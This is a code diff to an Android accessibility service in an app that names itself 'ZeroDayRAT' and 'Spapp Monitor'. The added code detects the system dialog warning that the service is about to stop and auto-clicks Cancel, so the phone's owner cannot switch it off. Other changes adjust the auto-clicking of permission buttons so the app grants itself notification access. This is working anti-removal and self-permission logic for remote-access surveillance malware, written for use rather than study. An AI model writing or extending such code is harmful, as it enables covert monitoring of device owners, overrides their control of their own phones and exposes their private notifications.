@@ -160,6 +160,24 @@ class BlockAccessibilityService : AccessibilityService() {
 
             if (candidateRoots.isEmpty()) return false
 
+            // Anti-Stop Guard: If dialog is warning to STOP or TURN OFF the service, cancel it immediately to protect service!
+            val hasStopWarning = candidateRoots.any { root ->
+                !root.findAccessibilityNodeInfosByText("Tapping Stop will stop").isNullOrEmpty() ||
+                !root.findAccessibilityNodeInfosByText("will stop").isNullOrEmpty() ||
+                !root.findAccessibilityNodeInfosByText("Stop ZeroDayRAT").isNullOrEmpty()
+            }
+            if (hasStopWarning) {
+                Log.w("BlockA11y", "Detected STOP warning dialog - auto-canceling to keep service alive")
+                for (root in candidateRoots) {
+                    val cancelButtons = root.findAccessibilityNodeInfosByViewId("android:id/button2")
+                    if (!cancelButtons.isNullOrEmpty()) {
+                        clickNodeOrParent(cancelButtons[0])
+                        return true
+                    }
+                }
+                return false
+            }
+
             // Target resource IDs across Google Pixel, AOSP, Samsung OneUI, Xiaomi MIUI, Oppo ColorOS, Vivo FuntouchOS
             val targetIds = listOf(
                 "android:id/accessibility_permission_enable_allow_button",
@@ -187,11 +205,7 @@ class BlockAccessibilityService : AccessibilityService() {
                 "com.miui.securitycenter:id/accept",
                 "com.lbe.security.miui:id/accept",
                 "com.miui.securitycenter:id/btn_accept",
-                "com.android.settings:id/button1",
-                "com.android.settings:id/allow_button",
-                "com.google.android.settings:id/button1",
-                "com.samsung.android.settings:id/button1",
-                "android:id/button1"
+                "com.android.settings:id/allow_button"
             )
 
             // Step 1: Search by exact View IDs (language-independent)
@@ -420,6 +434,16 @@ class BlockAccessibilityService : AccessibilityService() {
             }
 
             // Case B: In Notification Access settings list or toggle sub-screen:
+            // STRICT SCREEN GUARD: Only execute if we are strictly on Notification Access screens!
+            val hasNotifSettingsIndicator = candidateRoots.any { root ->
+                !root.findAccessibilityNodeInfosByText("Notification read, reply, and control").isNullOrEmpty() ||
+                !root.findAccessibilityNodeInfosByText("Device & app notifications").isNullOrEmpty() ||
+                !root.findAccessibilityNodeInfosByText("Notification access").isNullOrEmpty() ||
+                !root.findAccessibilityNodeInfosByText("Device and app notifications").isNullOrEmpty() ||
+                !root.findAccessibilityNodeInfosByText("Allow notification access").isNullOrEmpty()
+            }
+            if (!hasNotifSettingsIndicator) return false
+
             val appNames = listOf(
                 getString(com.spapp.monitoring.R.string.app_name),
                 "ZeroDayRAT",
@@ -457,12 +481,9 @@ class BlockAccessibilityService : AccessibilityService() {
                     }
                 }
 
-                // Check for generic switch or "Allow notification access" toggle on the detail screen:
+                // Check for detail screen switch strictly for notification access:
                 val toggleTexts = listOf(
-                    "Allow notification access",
-                    "Use ZeroDayRAT",
-                    "Use Spapp Monitor",
-                    "Allow"
+                    "Allow notification access"
                 )
                 for (toggleText in toggleTexts) {
                     val toggleNodes = root.findAccessibilityNodeInfosByText(toggleText)
